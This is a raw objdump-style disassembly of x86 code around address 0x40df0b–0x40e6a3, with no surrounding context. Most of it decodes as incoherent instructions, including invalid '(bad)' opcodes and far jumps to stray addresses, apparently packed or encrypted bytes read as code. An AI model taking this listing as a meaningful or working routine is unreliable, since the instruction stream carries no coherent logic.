  40df0b:	jnp    0x40df26
  40df0d:	pop    ds
  40df0e:	lods   eax,DWORD PTR ds:[esi]
  40df0f:	pop    eax
  40df10:	or     DWORD PTR [eax-0x28f5e146],edi
  40df16:	xchg   edx,eax
  40df17:	scas   al,BYTE PTR es:[edi]
  40df18:	jae    0x40df95
  40df1a:	mov    esp,0x6f34ed9c
  40df1f:	aaa    
  40df20:	sbb    BYTE PTR [ecx],0xc4
  40df23:	cmp    eax,0x2b77338a
  40df28:	adc    al,bl
  40df2a:	cwde   
  40df2b:	cmp    BYTE PTR [ecx-0x6],0x7
  40df2f:	inc    esp
  40df30:	inc    esi
  40df31:	clc    
  40df32:	mov    bh,0x5f
  40df34:	sbb    BYTE PTR [eax-0x6325dd6],0xad
  40df3b:	out    0xe3,al
  40df3d:	mov    edx,0x2609ddb5
  40df42:	neg    DWORD PTR [ecx]
  40df44:	stc    
  40df45:	push   ebx
  40df46:	cli    
  40df47:	cli    
  40df48:	push   edi
  40df49:	mov    bh,0x1e
  40df4b:	mov    ebx,0xba9f861c
  40df50:	imul   ebp,DWORD PTR [eax],0x62
  40df53:	push   0x7a
  40df55:	je     0x40dfa7
  40df57:	scas   al,BYTE PTR es:[edi]
  40df58:	fcmovnbe st,st(7)
  40df5a:	rcl    eax,0xbc
  40df5d:	je     0x40dee3
  40df5f:	loope  0x40df3d
  40df61:	(bad)  
  40df62:	sub    edx,edx
  40df64:	mov    ch,0x7b
  40df67:	sbb    dl,cl
  40df69:	ret    0x3060
  40df6c:	xchg   ah,bh
  40df6e:	dec    ebx
  40df6f:	cs mov edx,0x6f9ad0a4
  40df75:	sub    al,0x40
  40df77:	inc    edx
  40df78:	jae    0x40dfb1
  40df7a:	ret    0x9157
  40df7d:	je     0x40df5b
  40df7f:	push   ds
  40df80:	repnz or al,0xab
  40df83:	(bad)  
  40df84:	out    0x8d,eax
  40df86:	pop    eax
  40df87:	iret   
  40df88:	sub    al,0xc7
  40df8a:	rcr    ch,cl
  40df8c:	adc    eax,0x234f96cb
  40df91:	fstp   st(0)
  40df93:	jp     0x40dffd
  40df95:	mov    cl,0xb9
  40df97:	gs mov ebx,0xbd3a05bc
  40df9d:	xor    al,0x3d
  40df9f:	enter  0x7975,0xc4
  40dfa3:	(bad)  
  40dfa4:	and    esp,DWORD PTR [eax]
  40dfa6:	outs   dx,BYTE PTR ds:[esi]
  40dfa7:	mov    dl,0x8f
  40dfa9:	mov    ebp,0x4589c303
  40dfae:	lods   al,BYTE PTR ds:[esi]
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x1240413a],1
  40dfde:	cmp    al,BYTE PTR [edi]
  40dfe0:	fisttp WORD PTR [eax+0x357878b2]
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40dfa0
  40dfea:	sbb    ah,0xf0
  40dfed:	cmp    eax,0xb0e26a9f
  40dff2:	rcr    ch,cl
  40dff4:	push   ds
  40dff5:	push   0xffffffd6
  40dff7:	mov    edx,0x880c677c
  40dffc:	lea    ecx,[ebp+0x5]
  40dfff:	pop    edx
  40e000:	adc    al,0x66
  40e002:	(bad)  
  40e003:	loopne 0x40e00a
  40e005:	daa    
  40e006:	lds    ecx,FWORD PTR [ebx]
  40e008:	dec    ebp
  40e009:	in     eax,0x6
  40e00b:	jle    0x40e05a
  40e00d:	and    eax,0xb3a731d0
  40e012:	inc    ebx
  40e013:	jp     0x40e07f
  40e015:	xor    eax,0x89853316
  40e01a:	inc    ecx
  40e01b:	jmp    0x40e023
  40e01d:	inc    esi
  40e01e:	fdivr  st,st(4)
  40e020:	fnstcw WORD PTR [edi+edx*1]
  40e023:	push   cs
  40e024:	or     ecx,edi
  40e026:	inc    ebp
  40e027:	leave  
  40e028:	fs aaa 
  40e02a:	in     eax,dx
  40e02b:	xchg   edi,eax
  40e02c:	mov    dh,0xef
  40e02e:	sub    BYTE PTR [ecx],cl
  40e030:	fadd   st,st(2)
  40e032:	pusha  
  40e033:	push   ss
  40e034:	push   edi
  40e035:	jge    0x40e045
  40e037:	ss aad 0xe0
  40e03a:	cmp    ch,0xc6
  40e03d:	addr16 xchg edi,eax
  40e03f:	jl     0x40e04e
  40e041:	mov    BYTE PTR [ebp+0x32442a41],dl
  40e047:	les    edx,FWORD PTR [edx]
  40e049:	imul   esi,DWORD PTR [ebp-0x7b05d84c],0xc3f59e32
  40e053:	and    edx,DWORD PTR [ebx]
  40e055:	cmp    DWORD PTR [ecx+esi*2+0x3ef11721],ebp
  40e05c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e05d:	fbld   TBYTE PTR [ecx+0x294f8a2d]
  40e063:	xchg   edx,eax
  40e064:	cmp    ecx,DWORD PTR [esi+edx*1+0xaa58577]
  40e06b:	jb     0x40e045
  40e06d:	add    edi,0x5c
  40e070:	jmp    0x40e034
  40e072:	imul   ebx,DWORD PTR [ecx],0x2d
  40e075:	mov    ch,0x5e
  40e077:	mov    ds:0xf76bfe7c,al
  40e07c:	mov    eax,0x8d5e119d
  40e081:	pop    edx
  40e082:	add    al,0x22
  40e084:	inc    eax
  40e085:	rol    DWORD PTR [eax+0x54edbac4],cl
  40e08b:	popf   
  40e08c:	pushf  
  40e08d:	xlat   BYTE PTR ds:[ebx]
  40e08e:	mov    bh,0x51
  40e090:	mov    ebx,0xd9ff816e
  40e095:	mov    dl,bl
  40e097:	popa   
  40e098:	mov    esi,0x573e64fb
  40e09d:	add    al,0xb6
  40e09f:	aam    0x33
  40e0a1:	xor    ecx,DWORD PTR [ecx+0x2db4d236]
  40e0a7:	push   0xf2818182
  40e0ac:	pushf  
  40e0ad:	xchg   edx,eax
  40e0ae:	(bad)  
  40e0af:	std    
  40e0b0:	dec    ebp
  40e0b1:	pop    ebp
  40e0b2:	sahf   
  40e0b3:	fsubr  st,st(7)
  40e0b5:	sbb    DWORD PTR [edx+0x7c],0x291b167f
  40e0bc:	retf   0x7ffb
  40e0bf:	inc    ebp
  40e0c0:	setae  BYTE PTR [ebx-0x5d]
  40e0c4:	push   0xffffffb3
  40e0c6:	sub    al,0x43
  40e0c8:	pop    eax
  40e0c9:	jae    0x40e08b
  40e0cb:	push   0x729f7eb8
  40e0d0:	pop    ebp
  40e0d1:	sbb    eax,0x2938ae4d
  40e0d6:	xor    eax,0xb7962017
  40e0db:	push   esp
  40e0dc:	inc    DWORD PTR [ebx-0x2e9646b7]
  40e0e2:	scas   al,BYTE PTR es:[edi]
  40e0e3:	shr    DWORD PTR [edi+0x19],1
  40e0e6:	push   0xffffffc2
  40e0e8:	pop    ds
  40e0e9:	or     eax,DWORD PTR [esi]
  40e0eb:	clc    
  40e0ec:	add    bl,al
  40e0ee:	cmc    
  40e0ef:	out    dx,eax
  40e0f0:	cwde   
  40e0f1:	cs fwait
  40e0f3:	or     BYTE PTR [edi-0x77f18a68],dl
  40e0f9:	mov    ss,WORD PTR [edx-0x79]
  40e0fc:	std    
  40e0fd:	fadd   QWORD PTR [edx]
  40e0ff:	and    al,0xaf
  40e101:	int    0xec
  40e103:	pop    ebp
  40e104:	mov    dh,0xea
  40e106:	bound  ecx,QWORD PTR [eax]
  40e108:	mov    ebp,0x8b827825
  40e10d:	pop    esi
  40e10e:	or     eax,0x62353988
  40e113:	nop
  40e114:	shr    edi,0x4e
  40e117:	sub    BYTE PTR [ebp+0x72],0x55
  40e11b:	push   edi
  40e11c:	push   esp
  40e11d:	js     0x40e119
  40e11f:	xor    BYTE PTR [ecx-0x47],al
  40e122:	iret   
  40e123:	cmp    bl,BYTE PTR [esi-0x30]
  40e126:	outs   dx,BYTE PTR ds:[esi]
  40e127:	mov    di,0xcb8b
  40e12b:	icebp  
  40e12c:	mov    edx,0x422401e3
  40e131:	adc    ebx,esp
  40e133:	inc    eax
  40e134:	cdq    
  40e135:	imul   esi,DWORD PTR es:[edi-0x3be54cd8],0xcf94f4f3
  40e140:	sub    esp,DWORD PTR [ecx-0x5a]
  40e143:	fld    QWORD PTR [eax+eax*4+0x60]
  40e147:	sbb    edx,ebx
  40e149:	xchg   ecx,eax
  40e14a:	push   edx
  40e14b:	adc    cl,BYTE PTR [ebp-0x7]
  40e14e:	aad    0xa9
  40e150:	dec    ebp
  40e151:	inc    edi
  40e152:	inc    ebx
  40e153:	repz sub bh,BYTE PTR [ecx]
  40e156:	in     eax,0x84
  40e158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e159:	jmp    0xab857b39
  40e15e:	sub    al,0x7c
  40e160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e161:	xchg   esi,eax
  40e162:	sub    DWORD PTR [ecx+0x48],0x24089c1c
  40e169:	push   ebp
  40e16a:	mov    esi,?
  40e16c:	imul   ecx,DWORD PTR [esi],0xffffffe0
  40e16f:	mov    edx,0x1716ffaf
  40e174:	add    ebx,esp
  40e176:	out    0x4d,al
  40e178:	mov    ebx,DWORD PTR [esi]
  40e17a:	and    eax,0xce442129
  40e17f:	xor    DWORD PTR [eax],ebp
  40e181:	and    ebx,DWORD PTR [esi+0x43874bf9]
  40e187:	popa   
  40e188:	ror    cl,1
  40e18a:	bound  ebp,QWORD PTR [eax]
  40e18c:	sub    DWORD PTR [ebp+0x5f],edx
  40e18f:	sti    
  40e190:	jne    0x40e17c
  40e192:	loopne 0x40e12f
  40e194:	xchg   BYTE PTR [edx-0x3eda4b21],al
  40e19a:	push   ecx
  40e19b:	sar    BYTE PTR [eax+edi*4+0x5c1eb525],1
  40e1a2:	jmp    0x40e138
  40e1a4:	xchg   esi,eax
  40e1a5:	cmp    esp,edx
  40e1a7:	inc    eax
  40e1a8:	push   eax
  40e1a9:	add    BYTE PTR [esi+edx*8-0x4eaccb8f],ch
  40e1b0:	lods   eax,DWORD PTR ds:[esi]
  40e1b1:	loopne 0x40e198
  40e1b3:	aam    0x36
  40e1b5:	and    BYTE PTR [esi-0x1fefcb12],dh
  40e1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1bc:	dec    edx
  40e1bd:	mov    ch,0xb5
  40e1bf:	inc    edx
  40e1c0:	popa   
  40e1c1:	jno    0x40e20b
  40e1c3:	add    esi,DWORD PTR [edx+0x631d77c7]
  40e1c9:	mov    ch,bh
  40e1cb:	mov    DWORD PTR [ebp-0x7391f140],ebx
  40e1d1:	test   al,0x6
  40e1d3:	jl     0x40e237
  40e1d5:	adc    BYTE PTR [edi],0x33
  40e1d8:	cli    
  40e1d9:	jno    0x40e1a0
  40e1db:	in     al,0x36
  40e1dd:	mov    cl,0x43
  40e1df:	ja     0x40e1c4
  40e1e1:	xor    eax,0xc259fefb
  40e1e6:	sbb    eax,0xf980942b
  40e1eb:	imul   ebx,DWORD PTR [edi],0xf15485e5
  40e1f1:	ror    BYTE PTR [ecx+eax*8],0xb0
  40e1f5:	lea    ebx,[edx-0x71]
  40e1f8:	mov    al,ds:0xce9c9ae3
  40e1fd:	push   edi
  40e1fe:	jp     0x40e1f4
  40e200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e201:	xor    ebp,DWORD PTR [ecx]
  40e203:	and    al,BYTE PTR [edx+0x1f23a74e]
  40e209:	jg     0x40e18b
  40e20b:	xor    ah,BYTE PTR [ecx]
  40e20d:	cdq    
  40e20e:	test   dl,0x79
  40e211:	sbb    eax,0xe70fbe14
  40e216:	das    
  40e217:	rcl    DWORD PTR [edi-0x7f],1
  40e21a:	mov    al,ds:0x997375bd
  40e21f:	hlt    
  40e220:	dec    edx
  40e221:	cmp    ebp,DWORD PTR [edx+0x3c6335e]
  40e227:	ret    
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	pop    ecx
  40e23b:	or     bl,BYTE PTR [edi+esi*4]
  40e23e:	inc    ebp
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e23c
  40e247:	cmp    eax,0xe4bd9a7f
  40e24c:	sti    
  40e24d:	scas   eax,DWORD PTR es:[edi]
  40e24e:	int    0x24
  40e250:	dec    esi
  40e251:	sti    
  40e252:	jns    0x40e225
  40e254:	fld    QWORD PTR [ebp+0x6059c551]
  40e25a:	jmp    0x5bef4b7f
  40e25f:	inc    ecx
  40e260:	fs pop es
  40e262:	mov    eax,0x1d33d107
  40e267:	jne    0x40e2a7
  40e269:	xchg   edx,eax
  40e26a:	out    dx,eax
  40e26b:	jmp    0x40e299
  40e26d:	inc    edi
  40e26e:	xor    BYTE PTR [edi],ah
  40e270:	hlt    
  40e271:	pop    ebp
  40e272:	adc    DWORD PTR [edx+eiz*2-0x56],ebx
  40e276:	outs   dx,DWORD PTR ds:[esi]
  40e277:	and    DWORD PTR [ebx+0x3bebf0cd],esi
  40e27d:	test   eax,0x93494e16
  40e282:	inc    edi
  40e283:	test   esp,ebp
  40e285:	imul   ebp,DWORD PTR [ecx-0x3e],0xfffffffe
  40e289:	jno    0x40e2e7
  40e28b:	loop   0x40e2a0
  40e28d:	inc    ecx
  40e28e:	fstp   QWORD PTR [edi+eiz*4-0x2499a513]
  40e295:	nop
  40e296:	scas   al,BYTE PTR es:[edi]
  40e297:	cdq    
  40e298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e299:	cmp    al,0xbc
  40e29b:	aas    
  40e29c:	or     DWORD PTR [ebx+0x1e],0xdccb22bd
  40e2a3:	push   edi
  40e2a4:	lahf   
  40e2a5:	push   ds
  40e2a6:	lods   al,BYTE PTR ds:[esi]
  40e2a7:	les    esi,FWORD PTR [ebp*8+0x5adbba20]
  40e2ae:	adc    ah,BYTE PTR [ebp-0x3f298077]
  40e2b4:	sbb    eax,0xb64558a1
  40e2b9:	xchg   esi,eax
  40e2ba:	push   ecx
  40e2bb:	stos   BYTE PTR es:[edi],al
  40e2bc:	addr16 push ecx
  40e2be:	push   ss
  40e2bf:	daa    
  40e2c0:	ret    
  40e2c1:	or     dh,dh
  40e2c3:	dec    ebp
  40e2c4:	push   ds
  40e2c5:	or     bh,BYTE PTR [eax+0x524ab632]
  40e2cb:	or     edi,DWORD PTR [esi-0x1e70bad3]
  40e2d1:	sub    BYTE PTR [esi-0x7e],0xd5
  40e2d5:	in     al,dx
  40e2d6:	add    al,0x8d
  40e2d8:	outs   dx,BYTE PTR ds:[esi]
  40e2d9:	mov    ah,0xeb
  40e2db:	aam    0xeb
  40e2dd:	xlat   BYTE PTR ds:[ebx]
  40e2de:	jp     0x40e305
  40e2e0:	aas    
  40e2e1:	fwait
  40e2e2:	pop    es
  40e2e3:	or     ecx,edi
  40e2e5:	loopne 0x40e281
  40e2e7:	mov    edi,0x3d22e695
  40e2ec:	dec    ecx
  40e2ed:	nop
  40e2ee:	inc    ebx
  40e2ef:	adc    esi,DWORD PTR [edi-0x54896785]
  40e2f5:	cmc    
  40e2f6:	ss dec ecx
  40e2f8:	test   eax,0x449b4b41
  40e2fd:	sbb    al,0x73
  40e2ff:	mov    dh,0xf3
  40e301:	loop   0x40e327
  40e303:	aas    
  40e304:	and    ebx,DWORD PTR [ebx]
  40e306:	jmp    0x28e6d512
  40e30b:	gs jne 0x40e2d7
  40e30e:	xlat   BYTE PTR ds:[ebx]
  40e30f:	mov    ds:0xb4003c71,eax
  40e314:	push   0xf3d98d30
  40e319:	cs in  eax,0xe5
  40e31c:	cmp    bh,bh
  40e31e:	repz xchg ecx,esp
  40e321:	loope  0x40e39d
  40e323:	(bad)  
  40e324:	or     esi,ebp
  40e326:	jnp    0x40e35f
  40e328:	sahf   
  40e329:	nop
  40e32a:	cld    
  40e32b:	pop    esi
  40e32c:	fs icebp 
  40e32e:	data16 stc 
  40e330:	xchg   bx,ax
  40e332:	sub    al,bh
  40e334:	out    0xce,al
  40e336:	jp     0x40e3b1
  40e338:	xor    DWORD PTR [esi],0xffffffd0
  40e33b:	cmp    BYTE PTR [esi+0x63],dl
  40e33e:	mov    DWORD PTR [ebx],eax
  40e340:	jnp    0x40e3b1
  40e342:	cmp    BYTE PTR [ecx-0x390393a9],0xde
  40e349:	stos   BYTE PTR es:[edi],al
  40e34a:	mov    cl,0xe2
  40e34c:	dec    ebp
  40e34d:	iret   
  40e34e:	in     eax,dx
  40e34f:	mov    eax,ds:0x22db3700
  40e354:	scas   eax,DWORD PTR es:[edi]
  40e355:	shr    BYTE PTR [edx],0xef
  40e358:	mov    ds:0x8e10afb6,eax
  40e35d:	xchg   edi,eax
  40e35e:	test   eax,0x11706d1
  40e363:	ss bnd jae 0x40e35a
  40e367:	mov    bh,0x44
  40e369:	dec    edi
  40e36a:	jb     0x40e3c3
  40e36c:	adc    ecx,DWORD PTR [eax]
  40e36e:	sbb    DWORD PTR [eiz*1+0xdd18e0e],ecx
  40e375:	(bad)  
  40e376:	and    eax,0xd26092f
  40e37b:	pop    esp
  40e37c:	jnp    0x40e381
  40e37e:	cmc    
  40e37f:	rcr    DWORD PTR [ebx+ebp*4],0x53
  40e383:	sub    eax,0x779b1a8
  40e388:	cld    
  40e389:	adc    ebp,DWORD PTR [ebx+0x5c6b8116]
  40e38f:	or     eax,0xbe63bda8
  40e394:	aas    
  40e395:	sub    esi,DWORD PTR [ebx+ebp*8+0x69fad1b1]
  40e39c:	in     al,dx
  40e39d:	out    dx,eax
  40e39e:	dec    edx
  40e39f:	sub    ecx,DWORD PTR [ebx+0x73]
  40e3a2:	ins    BYTE PTR es:[edi],dx
  40e3a3:	fstp   QWORD PTR [edx]
  40e3a5:	repz retf 
  40e3a7:	add    DWORD PTR [ebx],esp
  40e3a9:	sub    DWORD PTR [esi],ebp
  40e3ab:	pop    esp
  40e3ac:	jne    0x40e351
  40e3ae:	mov    edx,0x91899b16
  40e3b3:	mov    esi,0x53981873
  40e3b8:	bound  ebp,QWORD PTR [edx-0x5164cce]
  40e3be:	push   edi
  40e3bf:	addr16 retf 
  40e3c1:	adc    eax,0x3115b5bb
  40e3c6:	clc    
  40e3c7:	dec    eax
  40e3c8:	and    ecx,DWORD PTR [edi-0x51ae5282]
  40e3ce:	enter  0x3bf1,0x92
  40e3d2:	(bad)  
  40e3d4:	jbe    0x40e3f5
  40e3d6:	jnp    0x40e3f4
  40e3d8:	mov    edi,0x5ad3e5a3
  40e3dd:	add    ecx,esi
  40e3df:	push   esp
  40e3e0:	or     ebp,DWORD PTR [ebx]
  40e3e2:	ror    ebp,1
  40e3e4:	inc    esp
  40e3e5:	xchg   esi,eax
  40e3e6:	cmc    
  40e3e7:	lds    esi,FWORD PTR ds:0xcdfa1da0
  40e3ed:	std    
  40e3ee:	shl    dh,cl
  40e3f0:	mov    esi,0xd71bf208
  40e3f5:	cli    
  40e3f6:	jbe    0x40e46e
  40e3f8:	scas   al,BYTE PTR es:[edi]
  40e3f9:	(bad)  
  40e3fa:	mov    ds:0xa56baba8,eax
  40e3ff:	jmp    0x40e475
  40e401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e402:	push   edx
  40e403:	mov    ebx,0x48d8f0f7
  40e408:	xchg   edi,eax
  40e409:	push   0x5929ef60
  40e40e:	bound  ebx,QWORD PTR [ebx]
  40e410:	inc    eax
  40e411:	sbb    al,ch
  40e413:	pop    ecx
  40e414:	ins    DWORD PTR es:[edi],dx
  40e415:	loop   0x40e3b0
  40e417:	data16 int 0x89
  40e41a:	inc    edi
  40e41b:	ret    
  40e41c:	add    BYTE PTR [edx+0x6f],ch
  40e41f:	mov    ds:0x276afb57,al
  40e424:	not    DWORD PTR [edi]
  40e426:	ret    0xe806
  40e429:	cmp    dl,BYTE PTR [ebp-0x4a8ea73d]
  40e42f:	js     0x40e416
  40e431:	sbb    al,0xbe
  40e433:	xchg   esi,eax
  40e434:	rcr    BYTE PTR [edx],cl
  40e436:	mov    edx,DWORD PTR [esi-0x5b]
  40e439:	mov    DWORD PTR [ebx+0x6ffaebfd],esp
  40e43f:	in     eax,0xfb
  40e441:	ja     0x40e481
  40e443:	je     0x40e4c1
  40e445:	aaa    
  40e446:	xor    eax,0xee6fa24b
  40e44b:	jmp    0xeb7e3ffb
  40e450:	xorps  xmm3,XMMWORD PTR [eax-0x1f666018]
  40e457:	sbb    al,0x4e
  40e459:	or     al,0xa2
  40e45b:	neg    BYTE PTR [eax-0x1d]
  40e45e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e45f:	xchg   ecx,esp
  40e461:	xor    eax,0x8b001772
  40e466:	pop    esi
  40e467:	daa    
  40e468:	repz pop es
  40e46a:	aas    
  40e46b:	out    dx,eax
  40e46c:	pushw  0xfff9
  40e46f:	mov    esi,0x9d928caa
  40e474:	inc    edi
  40e475:	mov    WORD PTR [edx+esi*8],?
  40e478:	fild   DWORD PTR [ebx]
  40e47a:	ss xchg esi,eax
  40e47c:	jne    0x40e4c9
  40e47e:	and    BYTE PTR [edx],cl
  40e480:	loop   0x40e423
  40e482:	push   es
  40e483:	jmp    0x40e4c6
  40e485:	add    BYTE PTR [eax+0x5c],ch
  40e488:	jmp    0x6e8:0x30ff0041
  40e48f:	lods   eax,DWORD PTR ds:[esi]
  40e490:	add    BYTE PTR [eax],al
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    esi,DWORD PTR [edi+0x288340b]
  40e4bc:	mov    ch,0x78
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e52d
  40e4c4:	pop    edx
  40e4c5:	fwait
  40e4c6:	jmp    0x40e4ab
  40e4c8:	cdq    
  40e4c9:	cdq    
  40e4ca:	aaa    
  40e4cb:	rol    DWORD PTR [ebp+0x7c1eb4ee],cl
  40e4d1:	sub    esi,edi
  40e4d3:	push   ebp
  40e4d4:	rol    BYTE PTR ds:0xf7944774,0x55
  40e4db:	mov    al,ds:0xd687b3f8
  40e4e0:	in     eax,0xb4
  40e4e2:	int3   
  40e4e3:	xchg   ecx,eax
  40e4e4:	aas    
  40e4e5:	outs   dx,DWORD PTR ds:[esi]
  40e4e6:	pop    edx
  40e4e7:	or     eax,0x606dbafa
  40e4ec:	push   ecx
  40e4ed:	dec    esp
  40e4ee:	mov    DWORD PTR [eax],esi
  40e4f0:	push   esp
  40e4f1:	(bad)  
  40e4f2:	mov    ebp,0x4a73e1a1
  40e4f7:	sub    al,0x64
  40e4f9:	std    
  40e4fa:	sahf   
  40e4fb:	test   eax,0x6313aa04
  40e500:	int3   
  40e501:	or     edx,DWORD PTR [esi+0x7088e05f]
  40e507:	retf   0xae41
  40e50a:	stos   BYTE PTR es:[edi],al
  40e50b:	daa    
  40e50c:	pop    esi
  40e50d:	shl    DWORD PTR [edi-0x43],1
  40e510:	adc    dl,al
  40e512:	sub    ebp,ebx
  40e514:	xchg   ecx,eax
  40e515:	inc    esi
  40e516:	fwait
  40e517:	test   BYTE PTR [ebp-0x51a21df3],0x5
  40e51e:	mov    dl,0x70
  40e520:	inc    edx
  40e521:	(bad)
  40e525:	daa    
  40e526:	fwait
  40e527:	cwde   
  40e528:	cmp    ebx,DWORD PTR [ebx-0x19fd102a]
  40e52e:	lods   eax,DWORD PTR ds:[esi]
  40e52f:	(bad)  
  40e530:	out    dx,eax
  40e531:	scas   al,BYTE PTR es:[edi]
  40e532:	jg     0x40e4e9
  40e534:	add    esi,DWORD PTR [ebx]
  40e536:	outs   dx,BYTE PTR ds:[esi]
  40e537:	outs   dx,DWORD PTR ds:[esi]
  40e538:	call   0xd78091c
  40e53d:	adc    DWORD PTR [eax-0x7c],edx
  40e540:	push   0x621ac3ab
  40e545:	push   0x4b
  40e547:	cmp    BYTE PTR [ebx],dh
  40e549:	leave  
  40e54a:	sub    eax,0xb3db6e7f
  40e54f:	cmp    DWORD PTR [eax-0x51],ebx
  40e552:	repz jge 0x40e4fb
  40e555:	clc    
  40e556:	(bad)  
  40e558:	add    ah,bh
  40e55a:	jmp    0xcd12:0x654a25a9
  40e561:	xor    eax,0x5269ece4
  40e566:	sbb    al,0xa1
  40e568:	and    BYTE PTR [ebx+0x5e9bc7e5],dl
  40e56e:	lahf   
  40e56f:	fild   QWORD PTR [ecx-0x1755603c]
  40e575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e576:	aas    
  40e577:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e579:	call   0xfe20:0xb0f97e24
  40e580:	cdq    
  40e581:	pop    ds
  40e582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e583:	fs and eax,0x4adc68ed
  40e589:	and    eax,0xfdcb742d
  40e58e:	clc    
  40e58f:	sub    al,0x91
  40e591:	mov    es,WORD PTR [edi+0x7c]
  40e594:	push   ecx
  40e595:	or     DWORD PTR [eax],esp
  40e597:	push   esp
  40e598:	mov    dh,0xbd
  40e59a:	push   esi
  40e59b:	dec    ecx
  40e59c:	xchg   ecx,eax
  40e59d:	cmp    BYTE PTR [edx+0x3d],dl
  40e5a0:	jae    0x40e5b1
  40e5a2:	leave  
  40e5a3:	popf   
  40e5a4:	loopne 0x40e5e3
  40e5a6:	mov    eax,ds:0x16dbe401
  40e5ab:	jl     0x40e57f
  40e5ad:	mov    ecx,0xac7319f7
  40e5b2:	(bad)  
  40e5b3:	mov    ah,0xcb
  40e5b5:	call   0x60df2cc2
  40e5ba:	cdq    
  40e5bb:	sahf   
  40e5bc:	imul   esi,DWORD PTR [ecx+0x374aef94],0xb827775a
  40e5c6:	aad    0x7b
  40e5c8:	pop    ds
  40e5c9:	adc    al,0x15
  40e5cb:	or     ch,BYTE PTR [edx]
  40e5cd:	push   ss
  40e5ce:	rol    BYTE PTR [esi],1
  40e5d0:	pop    esp
  40e5d1:	ret    
  40e5d2:	rcl    DWORD PTR [ebp+0x483141cd],1
  40e5d8:	inc    esp
  40e5d9:	(bad)  
  40e5da:	xchg   edx,eax
  40e5db:	repz out 0xd4,eax
  40e5de:	mov    dl,0x75
  40e5e0:	dec    esi
  40e5e1:	sbb    DWORD PTR [edx],esi
  40e5e3:	mov    edx,0x3c1e53bb
  40e5e8:	imul   esp,DWORD PTR [ebp-0x1929fc08],0xc378e402
  40e5f2:	sbb    BYTE PTR [eax-0x3648fb85],bh
  40e5f8:	jp     0x40e623
  40e5fa:	aad    0x6c
  40e5fc:	ds jmp 0x40e60e
  40e5ff:	dec    edi
  40e600:	mov    cl,0xb6
  40e602:	ss inc eax
  40e604:	jmp    0x3ed9:0x29627c8f
  40e60b:	sti    
  40e60c:	leave  
  40e60d:	sahf   
  40e60e:	lods   al,BYTE PTR ds:[esi]
  40e60f:	out    0x74,eax
  40e611:	jne    0x40e5c8
  40e613:	stos   BYTE PTR es:[edi],al
  40e614:	sar    BYTE PTR [esi-0x4c4358ac],cl
  40e61a:	xchg   esi,eax
  40e61b:	pop    eax
  40e61c:	push   edx
  40e61d:	icebp  
  40e61e:	jg     0x40e66b
  40e620:	or     eax,0x6bc87866
  40e625:	sbb    eax,0x5cb72fc9
  40e62a:	or     dh,BYTE PTR [esi-0x1b]
  40e62d:	xchg   ebp,eax
  40e62e:	dec    edx
  40e62f:	retf   0x975e
  40e632:	push   ecx
  40e633:	jns    0x40e5df
  40e635:	sub    esp,DWORD PTR [esi-0x17e95b7a]
  40e63b:	pop    esp
  40e63c:	and    eax,edi
  40e63e:	dec    ebx
  40e63f:	fsubr  DWORD PTR [edi-0x5a27fd18]
  40e645:	clc    
  40e646:	call   0x5db2:0x384933c2
  40e64d:	test   BYTE PTR [edx-0x53],cl
  40e650:	or     eax,0xeeed4a11
  40e655:	popf   
  40e656:	adc    DWORD PTR [edi+0x2d],esp
  40e659:	and    DWORD PTR [eax],edi
  40e65b:	adc    bl,BYTE PTR [edx]
  40e65d:	pushf  
  40e65e:	dec    esp
  40e65f:	jae    0x40e662
  40e661:	test   al,0xd4
  40e663:	fs jmp 0x40e65b
  40e666:	adc    BYTE PTR [ebp+0x63],dh
  40e669:	mov    ebp,0xa45cbb5d
  40e66e:	mov    ds:0xf193b97d,eax
  40e673:	dec    eax
  40e674:	pop    edi
  40e675:	call   FWORD PTR [ebp-0x9]
  40e678:	jo     0x40e69e
  40e67a:	mov    ds:0x5b7a30d0,al
  40e67f:	sbb    BYTE PTR [eax+0x10f15e13],ch
  40e685:	add    DWORD PTR [ebx],ebp
  40e687:	cmp    eax,0xb84bb38c
  40e68c:	lea    edx,[ecx+0x4c87549b]
  40e692:	xchg   DWORD PTR [edx-0x67],eax
  40e695:	mov    bh,0x63
  40e697:	mov    WORD PTR [eax],fs
  40e699:	adc    al,BYTE PTR [ebx]
  40e69b:	add    eax,0x10f8d4a7
  40e6a0:	mov    al,0xac
  40e6a2:	pushf  
  40e6a3:	pop    ss
